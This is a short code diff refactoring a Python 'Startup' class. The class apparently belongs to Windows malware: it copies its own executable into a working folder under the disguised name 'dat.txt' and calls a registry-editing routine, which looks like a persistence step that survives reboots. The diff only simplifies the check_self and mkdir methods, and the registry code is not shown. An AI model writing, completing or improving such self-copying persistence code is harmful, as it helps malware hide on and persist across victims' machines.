@@ -15,18 +15,12 @@ class Startup:
         self.regedit()
     
     def check_self(self) -> bool:
-        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
-            return True
-
-        return False
+        return os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt"
     
     def mkdir(self) -> str:
-        if not os.path.isdir(self.working_dir):
-            os.mkdir(self.working_dir)
-        
-        else:
+        if os.path.isdir(self.working_dir):
             shutil.rmtree(self.working_dir)
-            os.mkdir(self.working_dir)
+        os.mkdir(self.working_dir)
     
     def write_stub(self) -> None:
         shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
